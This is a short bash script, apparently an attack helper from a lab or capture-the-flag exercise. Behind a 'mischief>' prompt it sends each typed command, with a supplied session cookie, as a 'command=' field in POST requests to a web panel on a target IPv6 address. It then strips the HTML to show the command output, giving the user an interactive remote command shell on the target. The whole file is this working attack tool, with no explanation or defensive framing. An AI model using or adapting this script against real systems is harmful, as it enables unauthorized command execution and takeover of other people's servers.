#!/usr/bin/env bash

# Usage: ./command_execution_panel.sh <IP_STR> <COOKIE_STR>

IP=$1
COOKIE=$2

while :
do
	read -p "mischief> "  CMD
	curl -6 -s -X POST "http://[${IP}]:80/" -H "Cookie: ${COOKIE}" -d "command=${CMD};" | grep -F "</html>" -A 10 | grep -vF -e "</html>" -e "Command was executed succesfully!"
	echo
done
